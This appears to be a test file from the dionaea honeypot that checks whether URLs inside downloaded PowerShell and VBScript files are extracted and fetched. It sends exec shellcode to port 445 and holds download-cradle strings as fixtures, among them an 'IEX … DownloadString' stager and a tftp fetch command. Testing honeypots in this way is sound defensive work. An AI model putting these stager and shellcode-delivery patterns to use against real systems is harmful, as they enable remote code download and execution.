# This file is part of the dionaea honeypot
#
# SPDX-FileCopyrightText: none
#
# SPDX-License-Identifier: CC0-1.0

"""emu_scripts: the URL in a downloaded PowerShell / VBScript is downloaded as well.

emu_scripts reads the file of every dionaea.download.complete as bytes and
looks for URLs in it (a str regex on bytes used to fail with TypeError, so
no second download was ever offered). The chain of the test:

1. Shellcode on port 445 runs ``cmd.exe /c tftp -i <client> GET <script>``
   (emu profile -> cmd.exe emulation -> dionaea.download.offer tftp://...).
2. A TFTP server in this client container serves the script, dionaea
   downloads it (dionaea.download.complete).
3. emu_scripts finds ``$url = "http://<client>:<port>/<name>"`` (or the URL
   of a stager such as ``IEX (New-Object Net.WebClient).DownloadString('...')``)
   in it and offers that URL; an HTTP server in this container serves the payload.
4. dionaea downloads it: the offer and the download are in dionaea.sqlite
   (``offers``, ``downloads``) and the file is in binaries/<md5>.
"""

import hashlib
import socket
import time
import uuid

import pytest

from servers import FtpServer, HttpServer, TftpServer
from test_emu import winexec_shellcode


SCRIPTS = {
    "powershell": (
        "$wc = New-Object System.Net.WebClient\r\n"
        "$url = \"http://%(host)s:%(port)d/%(name)s\"\r\n"
        "$wc.DownloadFile($url, \"c:\\\\windows\\\\temp\\\\x.exe\")\r\n"
    ),
    # a stager in one line: the URL is the argument of the call, no variable
    "powershell-iex": (
        "IEX (New-Object Net.WebClient).DownloadString('http://%(host)s:%(port)d/%(name)s')\r\n"
    ),
    "vbscript": (
        "Set http = CreateObject(\"Msxml2.XMLHTTP\")\r\n"
        "http.Open \"GET\", \"http://%(host)s:%(port)d/%(name)s\", False\r\n"
        "http.Send\r\n"
    ),
}


@pytest.mark.parametrize("language", sorted(SCRIPTS))
def test_url_in_a_downloaded_script_is_downloaded(language, dionaea_host, my_ip, query_db, binaries_dir):
    token = uuid.uuid4().hex[:12]
    payload = ("payload %s %s\n" % (language, token)).encode() * 20
    name = "payload-%s.bin" % token
    http_server = HttpServer({"/" + name: payload}, my_ip)
    script = (SCRIPTS[language] % {"host": my_ip, "port": http_server.port, "name": name}).encode()
    script_name = "script-%s.txt" % token
    tftp_server = TftpServer({script_name: script}, my_ip)
    tftp_server.start()
    payload_url = "http://%s:%d/%s" % (my_ip, http_server.port, name)
    payload_md5 = hashlib.md5(payload).hexdigest()
    try:
        command = "cmd.exe /c tftp -i %s GET %s" % (my_ip, script_name)
        with socket.create_connection((dionaea_host, 445), timeout=10) as sock:
            sock.sendall(winexec_shellcode(command.encode()))
            deadline = time.monotonic() + 40
            rows = []
            while time.monotonic() < deadline:
                rows = query_db("SELECT download_md5_hash FROM downloads WHERE download_url = ?", (payload_url,))
                if rows:
                    break
                time.sleep(0.5)
        assert script_name in tftp_server.requests, "dionaea did not ask for the script over TFTP"
        offers = query_db("SELECT offer_url FROM offers WHERE offer_url = ?", (payload_url,))
        assert offers, "no offer for %s (emu_scripts found no URL in the script)" % payload_url
        assert "/" + name in http_server.requests, "dionaea did not fetch %s (connections: %r)" % (
            payload_url, http_server.connections)
        assert rows, "%s was offered but not downloaded within 40 s" % payload_url
        assert rows[0]["download_md5_hash"] == payload_md5
        assert (binaries_dir / payload_md5).read_bytes() == payload
    finally:
        tftp_server.close()
        http_server.close()


def test_ftp_url_in_a_downloaded_script_is_downloaded(dionaea_host, my_ip, query_db, binaries_dir, tmp_path):
    """The same chain, the URL in the script is an ftp:// URL (anonymous, active mode of dionaea's FTP client)."""
    token = uuid.uuid4().hex[:12]
    payload = ("ftp payload %s\n" % token).encode() * 20
    name = "payload-%s.bin" % token
    ftp_server = FtpServer({name: payload}, my_ip, str(tmp_path))
    ftp_url = "ftp://%s:%d/%s" % (my_ip, ftp_server.port, name)
    script = (
        "$wc = New-Object System.Net.WebClient\r\n"
        "$url = \"%s\"\r\n"
        "$wc.DownloadFile($url, \"c:\\\\windows\\\\temp\\\\x.exe\")\r\n" % ftp_url
    ).encode()
    script_name = "script-%s.txt" % token
    tftp_server = TftpServer({script_name: script}, my_ip)
    tftp_server.start()
    payload_md5 = hashlib.md5(payload).hexdigest()
    try:
        command = "cmd.exe /c tftp -i %s GET %s" % (my_ip, script_name)
        with socket.create_connection((dionaea_host, 445), timeout=10) as sock:
            sock.sendall(winexec_shellcode(command.encode()))
            deadline = time.monotonic() + 40
            rows = []
            while time.monotonic() < deadline:
                rows = query_db("SELECT download_md5_hash FROM downloads WHERE download_url = ?", (ftp_url,))
                if rows:
                    break
                time.sleep(0.5)
        assert query_db("SELECT offer_url FROM offers WHERE offer_url = ?", (ftp_url,)), "no offer for %s" % ftp_url
        assert ftp_server.port_commands, "dionaea's FTP client did not log in and send PORT"
        assert rows, "%s was offered but not downloaded within 40 s" % ftp_url
        assert rows[0]["download_md5_hash"] == payload_md5
        assert (binaries_dir / payload_md5).read_bytes() == payload
    finally:
        tftp_server.close()
        ftp_server.close()
